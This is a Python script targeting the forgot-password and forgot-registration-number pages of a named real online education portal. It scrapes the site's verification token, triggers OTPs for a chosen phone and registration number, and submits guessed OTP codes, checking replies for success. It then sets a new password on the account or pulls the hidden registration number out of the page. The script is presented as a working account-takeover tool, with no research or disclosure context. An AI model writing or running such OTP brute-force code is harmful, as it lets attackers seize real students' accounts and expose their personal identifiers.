import requests as r
from time import sleep
from bs4 import BeautifulSoup


session = r.Session()
url = "https://online.udvash-unmesh.com/Account/ForgotPassword"
try:
    res = session.get(url)
except:
    print("You are living under a rock, move out and get an internet connection.")
    exit()
cookie = res.headers["set-cookie"]
index = cookie.index(";") 
token = cookie[0:index]


data = {
        "__RequestVerificationToken=": token[27:] 
    }

class ChangePassword:
    wrongOTP = True
    def __init__(self,Phone,Registration):
        self.PhoneNumber = Phone
        self.registrationNumber = Registration 
    def req_otp(self):
        req_url = f"{url}?{token}&registrationNumber={self.registrationNumber}&mobileNumber={self.PhoneNumber}"
        session.get(req_url)


    def tryOTP(self,otp):
        data["RegistrationNumber"] = self.registrationNumber
        data["mobileNumber"] = self.PhoneNumber
        otp_url = "https://online.udvash-unmesh.com/Account/ForgotPassword"
        data["otp"] = otp
        otp_res = session.post(otp_url,data=data)
        if "Password length must be greater than or equal to 6" in otp_res.text:
            self.wrongOTP = False
        else:
            pass


    def changePass(self,password):
        data["NewPassword"]=password
        data["ConfirmPassword"]=password
        pass_res = session.post("https://online.udvash-unmesh.com/Account/SetNewPassword",data=data)
        if "CONGRATULATIONS!" in pass_res.text:
            return "Password was successfully changed!"
        else:
            print(pass_res)



class getRegNumber:
    wrongOTP = True
    def __init__(self,phone,nickName):
        self.phoneNumber = phone
        self.nickName = nickName


    def req_otp(self):
        otp_url = f"https://online.udvash-unmesh.com/Account/ForgotRegistrationNumber?{token}&mobileNumber={self.phoneNumber}&nickName={self.nickName}"
        session.get(otp_url)
    
    def tryOTP(self,otp):
        data["nickName"] = self.nickName
        data["mobileNumber"] = self.phoneNumber
        otp_url = "https://online.udvash-unmesh.com/Account/ForgotRegistrationNumber"
        data["otp"] = otp
        otp_res = session.post(otp_url,data = data)
        if "Your registration number" in otp_res.text:
            self.wrongOTP = False
            soup = BeautifulSoup(otp_res.content, 'html.parser')
            h3_tag = soup.find('h3', {'class': 'uu-login-form-sub-title'})
            span_tag = h3_tag.find('span')
            print(f"The registration number is:{span_tag.text}")
        else:
            pass
